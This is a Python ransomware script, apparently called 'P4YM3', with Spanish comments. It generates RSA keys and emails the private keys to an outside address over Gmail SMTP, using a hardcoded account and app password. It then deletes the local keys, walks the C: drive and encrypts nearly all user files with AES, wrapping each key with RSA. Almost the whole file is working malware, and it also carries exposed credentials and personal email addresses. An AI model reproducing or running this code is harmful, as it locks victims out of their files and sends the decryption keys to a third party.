import os
import base64
import secrets  
from typing import Tuple, Optional
from pathlib import Path
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from cryptography.hazmat.primitives import padding as sym_padding, hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.backends import default_backend


# ===== Encabezado para .p4ym3 con clave envuelta =====
HEADER_MAGIC = "P4Y1"
PKALG_RSA_OAEP_SHA256 = "RSA_OAEP_SHA256"
CONTRASENA_CIFRADO = "paymepliz"


def _make_header_line1(modo: str, key_bits: int, pk_alg: str) -> bytes:
    """
    Línea 1 (ASCII, termina en \n): P4Y1|<MODO>|<KEYBITS>|PKALG=<ALG>\n
    """
    return f"{HEADER_MAGIC}|{modo.upper()}|{key_bits}|PKALG={pk_alg}\n".encode("ascii")


def _make_header_line2_wrapped_key_b64(wrapped_key: bytes) -> bytes:
    """
    Línea 2 (ASCII, termina en \n): <WRAPPED_KEY_BASE64>\n
    """
    return (base64.b64encode(wrapped_key) + b"\n")


def _parse_header_2lines(blob: bytes):
    """
    Lee las dos primeras líneas ASCII del blob.
    Devuelve (modo, key_bits, pk_alg, wrapped_key_bytes, resto_bytes).
    """
    nl1 = blob.find(b"\n")
    if nl1 == -1:
        raise ValueError("Archivo sin encabezado: falta línea 1.")
    line1 = blob[:nl1].decode("ascii", errors="strict")
    parts = line1.split("|")
    if len(parts) < 3 or parts[0] != HEADER_MAGIC:
        raise ValueError("Encabezado (línea 1) no válido.")
    modo = parts[1].upper()
    key_bits = int(parts[2])
    pk_alg = PKALG_RSA_OAEP_SHA256  # por defecto
    if len(parts) >= 4 and parts[3].startswith("PKALG="):
        pk_alg = parts[3].split("=", 1)[1]

    # Línea 2: wrapped key en base64
    rem = blob[nl1 + 1:]
    nl2 = rem.find(b"\n")
    if nl2 == -1:
        raise ValueError("Archivo sin encabezado: falta línea 2 con clave envuelta.")
    line2 = rem[:nl2]
    try:
        wrapped_key = base64.b64decode(line2, validate=True)
    except Exception as e:
        raise ValueError("Línea 2 no es base64 válido para clave envuelta.") from e

    resto = rem[nl2 + 1:]
    return modo, key_bits, pk_alg, wrapped_key, resto



def enviar_claves_por_email(email_destino: str, priv_main_pem: bytes, pub_main_pem: bytes, 
                             priv_esp_pem: bytes, pub_esp_pem: bytes) -> bool:
    """
    Envía las claves RSA por email a pablomartinezpuentes@tutuamail.com.
    Utiliza Gmail con contraseña de aplicación.
    """
    try:
        # Configuración de Gmail
        email_remitente = "ualjgf002@gmail.com"
        # Nota: Usar contraseña de aplicación de Gmail, no la contraseña normal
        contraseña_app = "xgpt fpzy ykcm rsjp"  # Contraseña de aplicación Gmail
        
        # Crear mensaje
        mensaje = MIMEMultipart()
        mensaje["From"] = email_remitente
        mensaje["To"] = email_destino
        mensaje["Subject"] = "P4YM3 - Claves RSA para Cifrado [CRÍTICO]"
        
        # Cuerpo del email
        cuerpo = f"""
P4YM3 - SISTEMA DE CIFRADO AUTOMÁTICO

¡CLAVES GENERADAS Y ENVIADAS!

Se han generado nuevas claves RSA para el sistema de cifrado automático. Aquí están los detalles:

📋 INFORMACIÓN CRÍTICA:
- Contraseña de cifrado: {CONTRASENA_CIFRADO}
- Tamaño de clave: 3072 bits
- Algoritmo: RSA-OAEP-SHA256
- Modo de cifrado: AES-256-CTR
- Firma: RSA-PSS-SHA256

📁 CLAVES ADJUNTAS:
1. rsa_main_private.pem - Clave privada principal (CRÍTICO)
2. rsa_main_public.pem - Clave pública principal
3. rsa_special_private.pem - Clave privada especial (CRÍTICO)
4. rsa_special_public.pem - Clave pública especial

⚠️ SEGURIDAD MÁXIMA:
- GUARDA ESTAS CLAVES EN UN LUGAR MUY SEGURO
- La contraseña es: {CONTRASENA_CIFRADO}
- NO COMPARTAS las claves privadas con NADIE
- SIN ESTAS CLAVES, LOS ARCHIVOS NO PODRÁN DESCIFRARSE

🔐 NOTA: Las claves han sido ELIMINADAS del dispositivo tras el envío

⏰ Dispositivo: {os.getenv('USERNAME')}@{os.getenv('COMPUTERNAME')}
⏰ Fecha: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---
Sistema P4YM3 - Diciembre 2025
CIFRADO AUTOMÁTICO COMPLETADO
"""
        
        mensaje.attach(MIMEText(cuerpo, "plain", "utf-8"))
        
        # Adjuntar claves como texto
        mensaje.attach(MIMEText(f"=== CLAVE PRIVADA PRINCIPAL ===\n\n{priv_main_pem.decode()}", "plain"))
        mensaje.attach(MIMEText(f"=== CLAVE PÚBLICA PRINCIPAL ===\n\n{pub_main_pem.decode()}", "plain"))
        mensaje.attach(MIMEText(f"=== CLAVE PRIVADA ESPECIAL ===\n\n{priv_esp_pem.decode()}", "plain"))
        mensaje.attach(MIMEText(f"=== CLAVE PÚBLICA ESPECIAL ===\n\n{pub_esp_pem.decode()}", "plain"))
        
        # Enviar
        servidor = smtplib.SMTP("smtp.gmail.com", 587)
        servidor.starttls()
        servidor.login(email_remitente, contraseña_app)
        servidor.send_message(mensaje)
        servidor.quit()
        
        print(f"✓ Claves enviadas a {email_destino}")
        return True
        
    except Exception as e:
        print(f"⚠️ Error al enviar email: {e}")
        return False


# ===== Utilidades RSA =====
def generar_rsa_keypair(bits: int = 3072) -> Tuple[bytes, bytes]:
    """Genera un par RSA (privada y pública PEM, sin cifrar para automatización)."""
    private_key = rsa.generate_private_key(
        public_exponent=65537, 
        key_size=bits, 
        backend=default_backend()
    )
    # Sin cifrar para automatización
    priv_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    pub_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return priv_pem, pub_pem


def cargar_public_key_pem(path: str):
    with open(path, "rb") as f:
        data = f.read()
    return serialization.load_pem_public_key(data, backend=default_backend())


def cargar_private_key_pem(path: str, password: Optional[str] = None):
    with open(path, "rb") as f:
        data = f.read()
    pw_bytes = None if password is None or password == "" else password.encode("utf-8")
    return serialization.load_pem_private_key(data, password=pw_bytes, backend=default_backend())


def wrap_key_rsa_oaep(pubkey, key_bytes: bytes) -> bytes:
    return pubkey.encrypt(
        key_bytes,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def unwrap_key_rsa_oaep(privkey, wrapped: bytes) -> bytes:
    return privkey.decrypt(
        wrapped,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


# ===== Utilidades AES (Tarea 2) =====
def generar_clave(longitud_bits: int) -> bytes:
    if longitud_bits not in (128, 192, 256):
        raise ValueError("La longitud de clave debe ser 128, 192 o 256 bits.")
    return AESGCM.generate_key(bit_length=longitud_bits)


def _cipher_from_mode(clave: bytes, modo_upper: str, iv: bytes) -> Cipher:
    """Crear cipher según el modo."""
    if modo_upper == "CTR":
        return Cipher(algorithms.AES(clave), modes.CTR(iv))
    elif modo_upper == "CBC":
        return Cipher(algorithms.AES(clave), modes.CBC(iv))
    elif modo_upper == "CFB":
        return Cipher(algorithms.AES(clave), modes.CFB(iv))
    elif modo_upper == "OFB":
        return Cipher(algorithms.AES(clave), modes.OFB(iv))
    else:
        raise ValueError("Modo de cifrado no soportado (CBC/CFB/OFB/CTR)")


def _out_path_same_name_with_ext(input_path: str, suffix: str = "") -> str:
    d = os.path.dirname(input_path) or "."
    base = os.path.splitext(os.path.basename(input_path))[0]
    candidate = os.path.join(d, f"{base}{suffix}.p4ym3")
    in_abs = os.path.abspath(input_path)
    cand_abs = os.path.abspath(candidate)
    if cand_abs == in_abs or os.path.exists(candidate):
        i = 1
        while True:
            candidate2 = os.path.join(d, f"{base}{suffix}_{i}.p4ym3")
            cand2_abs = os.path.abspath(candidate2)
            if cand2_abs == in_abs or os.path.exists(candidate2):
                i += 1
                continue
            candidate = candidate2
            break
    return candidate


# ===== Firma Digital =====
def firmar_archivo(ruta_archivo: str, private_key_pem_path: str) -> str:
    """Firma un archivo y guarda la firma en .sig."""
    with open(ruta_archivo, "rb") as f:
        datos = f.read()
    
    privkey = cargar_private_key_pem(private_key_pem_path)
    firma = privkey.sign(
        datos,
        asym_padding.PSS(
            mgf=asym_padding.MGF1(hashes.SHA256()),
            salt_length=asym_padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    
    ruta_firma = ruta_archivo + ".sig"
    with open(ruta_firma, "wb") as f:
        f.write(base64.b64encode(firma))
    
    return ruta_firma


def verificar_firma(ruta_archivo: str, ruta_firma: str, public_key_pem_path: str) -> bool:
    """Verifica la firma de un archivo."""
    with open(ruta_archivo, "rb") as f:
        datos = f.read()
    
    with open(ruta_firma, "rb") as f:
        firma = base64.b64decode(f.read())
    
    pubkey = cargar_public_key_pem(public_key_pem_path)
    try:
        pubkey.verify(
            firma,
            datos,
            asym_padding.PSS(
                mgf=asym_padding.MGF1(hashes.SHA256()),
                salt_length=asym_padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except Exception:
        return False


# ===== Obtener archivos del ordenador =====
def obtener_todos_archivos(ruta_inicio: str = "C:\\", max_size_mb: int = 500) -> list:
    """
    Obtiene todos los archivos del ordenador (excepto sistema).
    max_size_mb: Tamaño máximo de archivo en MB para evitar archivos muy grandes.
    """
    archivos = []
    excluir_dirs = {
        "System Volume Information",
        "ProgramData",
        "$Recycle.Bin",
        "pagefile.sys",
        "hiberfil.sys",
        "swapfile.sys",
        "Windows",
        "Program Files",
        "Program Files (x86)",
        ".git",
        "__pycache__",
        "node_modules",
    }
    
    max_bytes = max_size_mb * 1024 * 1024
    
    try:
        for root, dirs, files in os.walk(ruta_inicio):
            # Filtrar directorios del sistema
            dirs[:] = [d for d in dirs if d not in excluir_dirs and not d.startswith('.')]
            
            for file in files:
                try:
                    ruta_completa = os.path.join(root, file)
                    # Evitar archivos de sistema muy grandes y archivos ya procesados
                    if os.path.isfile(ruta_completa) and os.path.getsize(ruta_completa) < max_bytes:
                        if not ruta_completa.endswith(('.p4ym3', '.sig', '.pem')):
                            archivos.append(ruta_completa)
                except (OSError, PermissionError):
                    pass
    except PermissionError:
        pass
    
    return archivos


def seleccionar_dos_archivos_aleatorios(archivos: list) -> list:
    """Selecciona 2 archivos aleatorios de la lista."""
    import random
    if len(archivos) < 2:
        return archivos
    return random.sample(archivos, min(2, len(archivos)))


def eliminar_claves_del_dispositivo() -> None:
    """Elimina las claves RSA del dispositivo de forma segura."""
    claves_a_eliminar = [
        "rsa_main_private.pem",
        "rsa_main_public.pem",
        "rsa_special_private.pem",
        "rsa_special_public.pem"
    ]
    
    for clave in claves_a_eliminar:
        if os.path.isfile(clave):
            try:
                # Sobrescribir con datos aleatorios antes de eliminar (seguridad)
                tamaño = os.path.getsize(clave)
                with open(clave, "wb") as f:
                    f.write(os.urandom(tamaño))
                # Eliminar archivo
                os.remove(clave)
                print(f"✓ Clave eliminada: {clave}")
            except Exception as e:
                print(f"⚠️ Error al eliminar {clave}: {e}")


# ===== Cifrado Automático =====
def cifrar_archivo_automatico(ruta_entrada: str, public_key_pem_path: str, modo: str = "CTR", key_bits: int = 256) -> str:
    """Cifra un archivo automáticamente con AES-CTR y envuelve con RSA."""
    if not os.path.isfile(ruta_entrada):
        raise FileNotFoundError(f"No existe: {ruta_entrada}")
    
    with open(ruta_entrada, "rb") as f:
        datos = f.read()

    iv = secrets.token_bytes(16)
    modo_upper = modo.upper()
    
    # Aplicar padding solo para CBC
    if modo_upper == "CBC":
        padder = sym_padding.PKCS7(128).padder()
        datos = padder.update(datos) + padder.finalize()

    clave = generar_clave(key_bits)

    pubkey = cargar_public_key_pem(public_key_pem_path)
    wrapped = wrap_key_rsa_oaep(pubkey, clave)

    cipher = _cipher_from_mode(clave, modo_upper, iv)
    encryptor = cipher.encryptor()
    datos_cifrados = encryptor.update(datos) + encryptor.finalize()

    header1 = _make_header_line1(modo_upper, key_bits, PKALG_RSA_OAEP_SHA256)
    header2 = _make_header_line2_wrapped_key_b64(wrapped)
    ruta_salida = _out_path_same_name_with_ext(ruta_entrada, suffix="")
    
    with open(ruta_salida, "wb") as f:
        f.write(header1 + header2 + iv + datos_cifrados)

    return ruta_salida


# ===== Proceso Automático Principal =====
def procesar_todos_archivos(dos_archivos_especiales: list) -> dict:
    """
    Cifra automáticamente:
    - Todos los archivos del ordenador con clave principal (CTR, 256 bits)
    - 2 archivos especiales con clave diferente
    - Firma todos los archivos cifrados
    """
    resultado = {
        "total": 0,
        "exitosos": 0,
        "errores": 0,
        "errores_detalles": [],
        "especiales_cifrados": 0,
    }
    
    print("=" * 70)
    print("  INICIANDO CIFRADO AUTOMÁTICO DE TODOS LOS ARCHIVOS DEL ORDENADOR")
    print("=" * 70)
    
    # Generar claves si no existen
    if not os.path.isfile("rsa_main_public.pem"):
        print("\n🔑 Generando par RSA principal...")
        priv_main, pub_main = generar_rsa_keypair(3072)
        with open("rsa_main_private.pem", "wb") as f:
            f.write(priv_main)
        with open("rsa_main_public.pem", "wb") as f:
            f.write(pub_main)
        print("   ✓ Claves principales generadas")
    
    if not os.path.isfile("rsa_special_public.pem"):
        print("🔑 Generando par RSA especial...")
        priv_esp, pub_esp = generar_rsa_keypair(3072)
        with open("rsa_special_private.pem", "wb") as f:
            f.write(priv_esp)
        with open("rsa_special_public.pem", "wb") as f:
            f.write(pub_esp)
        print("   ✓ Claves especiales generadas")
    
    # Cifrar archivos especiales primero
    print(f"\n🔐 Cifrando {len(dos_archivos_especiales)} archivos especiales...")
    for archivo_especial in dos_archivos_especiales:
        if os.path.isfile(archivo_especial):
            try:
                nom = os.path.basename(archivo_especial)[:50]
                print(f"   - {nom:<50}", end="")
                ruta_cifrada = cifrar_archivo_automatico(archivo_especial, "rsa_special_public.pem", "CTR", 256)
                firmar_archivo(ruta_cifrada, "rsa_main_private.pem")
                print(" ✓")
                resultado["especiales_cifrados"] += 1
            except Exception as e:
                print(f" ❌ ({str(e)[:30]})")
                resultado["errores_detalles"].append(f"{archivo_especial}: {e}")
    
    # Obtener todos los archivos
    print("\n📂 Escaneando todos los archivos del ordenador...")
    archivos = obtener_todos_archivos(ruta_inicio="C:\\", max_size_mb=500)
    print(f"   ✓ Se encontraron {len(archivos)} archivos para cifrar")
    
    resultado["total"] = len(archivos)
    
    # Cifrar todos los archivos
    print(f"\n🔐 Cifrando {len(archivos)} archivos (modo CTR, 256 bits)...")
    
    for i, archivo in enumerate(archivos, 1):
        # Evitar archivos ya procesados
        if archivo in dos_archivos_especiales:
            continue
        
        try:
            if i % 20 == 0 or i == 1:
                print(f"   [{i:5d}/{len(archivos)}]", end=" ")
                print(os.path.basename(archivo)[:50])
            
            ruta_cifrada = cifrar_archivo_automatico(archivo, "rsa_main_public.pem", "CTR", 256)
            firmar_archivo(ruta_cifrada, "rsa_main_private.pem")
            
            resultado["exitosos"] += 1
        except Exception as e:
            resultado["errores"] += 1
            resultado["errores_detalles"].append(f"{archivo}: {str(e)[:50]}")
    
    print("\n" + "=" * 70)
    print("  PROCESO COMPLETADO")
    print("=" * 70)
    print(f"✓ Archivos procesados:     {resultado['exitosos']}")
    print(f"✓ Archivos especiales:     {resultado['especiales_cifrados']}")
    print(f"❌ Errores:                {resultado['errores']}")
    print("=" * 70)
    
    return resultado


def descifrar_archivo_automatico(ruta_entrada: str, private_key_pem_path: str) -> str:
    """Descifra un archivo .p4ym3 automáticamente."""
    if not os.path.isfile(ruta_entrada):
        raise FileNotFoundError(f"No existe: {ruta_entrada}")
    
    with open(ruta_entrada, "rb") as f:
        blob = f.read()

    modo_upper, key_bits, pk_alg, wrapped_key, resto = _parse_header_2lines(blob)

    privkey = cargar_private_key_pem(private_key_pem_path)
    clave = unwrap_key_rsa_oaep(privkey, wrapped_key)

    if len(resto) < 16:
        raise ValueError("Archivo corrupto: faltan bytes para el IV.")
    iv, datos_cifrados = resto[:16], resto[16:]

    cipher = _cipher_from_mode(clave, modo_upper, iv)
    decryptor = cipher.decryptor()
    datos = decryptor.update(datos_cifrados) + decryptor.finalize()

    if modo_upper == "CBC":
        unpadder = sym_padding.PKCS7(128).unpadder()
        datos = unpadder.update(datos) + unpadder.finalize()

    ruta_salida = _out_path_same_name_with_ext(ruta_entrada, suffix="_dec")
    with open(ruta_salida, "wb") as f:
        f.write(datos)

    return ruta_salida


# ===== Interface principal (Se ejecuta automáticamente) =====
def main():
    print("\n" + "=" * 70)
    print("  SISTEMA DE CIFRADO AUTOMÁTICO P4YM3 - INICIANDO...")
    print("=" * 70)
    
    # Paso 1: Generar claves si no existen
    if not os.path.isfile("rsa_main_public.pem"):
        print("\n🔑 Paso 1: Generando claves RSA principales (3072 bits)...")
        priv_main, pub_main = generar_rsa_keypair(3072)
        with open("rsa_main_private.pem", "wb") as f:
            f.write(priv_main)
        with open("rsa_main_public.pem", "wb") as f:
            f.write(pub_main)
        print("   ✓ Claves principales generadas")
        
        print("\n🔑 Paso 2: Generando claves RSA especiales (3072 bits)...")
        priv_esp, pub_esp = generar_rsa_keypair(3072)
        with open("rsa_special_private.pem", "wb") as f:
            f.write(priv_esp)
        with open("rsa_special_public.pem", "wb") as f:
            f.write(pub_esp)
        print("   ✓ Claves especiales generadas")
        
        # Enviar claves por email automáticamente (SIN PREGUNTAR)
        print("\n📧 Paso 3: Enviando claves por email a pablomartinezpuentes@tutuamail.com...")
        email_destino = "pablomartinezpuentes@tutuamail.com"
        if enviar_claves_por_email(email_destino, priv_main, pub_main, priv_esp, pub_esp):
            print("   ✓ Claves enviadas exitosamente")
            
            # Paso 4: Eliminar claves del dispositivo después de enviar
            print("\n🗑️ Paso 4: Eliminando claves del dispositivo (seguridad)...")
            eliminar_claves_del_dispositivo()
            print("   ✓ Claves eliminadas del dispositivo")
        else:
            print("   ⚠️ Error al enviar claves, manteniéndolas en el dispositivo")
            return
    else:
        print("\n✓ Claves RSA detectadas - usando claves existentes")
    
    # Paso 2: Obtener todos los archivos y seleccionar 2 aleatorios
    print("\n" + "=" * 70)
    print("  PASO 1: ESCANEANDO ARCHIVOS Y SELECCIONANDO 2 ALEATORIOS")
    print("=" * 70)
    print("\n📂 Escaneando archivos del ordenador...")
    archivos = obtener_todos_archivos(ruta_inicio="C:\\", max_size_mb=500)
    print(f"   ✓ Se encontraron {len(archivos)} archivos")
    
    # Seleccionar 2 archivos aleatorios para cifrar con clave especial
    dos_especiales = seleccionar_dos_archivos_aleatorios(archivos)
    print(f"\n🎲 Se seleccionaron 2 archivos aleatorios para clave especial:")
    for i, archivo in enumerate(dos_especiales, 1):
        print(f"   {i}. {os.path.basename(archivo)[:60]}")
    
    # Paso 3: Ejecutar cifrado automático
    print("\n" + "=" * 70)
    print("  PASO 2: INICIANDO CIFRADO AUTOMÁTICO")
    print("=" * 70)
    procesar_todos_archivos(dos_especiales)
    
    print("\n" + "=" * 70)
    print("  ✓ PROCESO COMPLETADO EXITOSAMENTE")
    print("=" * 70)
    print("\n📊 Resumen:")
    print("   ✓ Claves generadas y enviadas a pablomartinezpuentes@tutuamail.com")
    print("   ✓ Claves eliminadas del dispositivo")
    print("   ✓ Archivos cifrados automáticamente")
    print("   ✓ 2 archivos aleatorios con clave especial")
    print("   ✓ Firma digital en todos los archivos")
    print("\n⚠️ NOTA CRÍTICA:")
    print("   - Las claves están SOLO en tu email")
    print("   - Sin las claves, los archivos NO pueden descifrarse")
    print("   - Contraseña: paymepliz")
    print("\n")
    input("Presiona Enter para cerrar...")


if __name__ == "__main__":
    main()
